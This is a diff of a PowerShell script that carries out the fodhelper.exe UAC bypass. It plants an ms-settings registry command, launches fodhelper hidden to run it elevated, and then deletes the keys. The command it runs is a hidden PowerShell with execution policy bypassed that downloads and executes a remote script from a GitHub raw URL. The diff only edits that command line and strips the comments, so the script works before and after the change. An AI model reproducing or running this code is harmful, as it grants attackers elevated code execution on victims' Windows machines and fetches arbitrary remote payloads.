@@ -1,22 +1,19 @@
-function Fodhelper(){ 
+ function Fodhelper(){ 
  Param (
            
-        [String]$program = "start /b cmd /c powershell -WindowStyle hidden -exec Bypass -c `"iex(iwr -useb 'https://raw.githubusercontent.com/jabdotNet/tests/main/x1.ps3')`""
+        [String]$program = "cmd /c `"powershell -WindowStyle hidden -exec Bypass -c `"iex(iwr -useb 'https://raw.githubusercontent.com/jabdotNet/tests/main/x1.ps3')`""
         
        )
 　
-    #Create Registry Structure
     New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
     New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
     Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
 　
-    #Start fodhelper.exe
     Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 　
-    #Cleanup
     Start-Sleep 3
     Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
 　
 }
 
-Fodhelper
+Fodhelper 
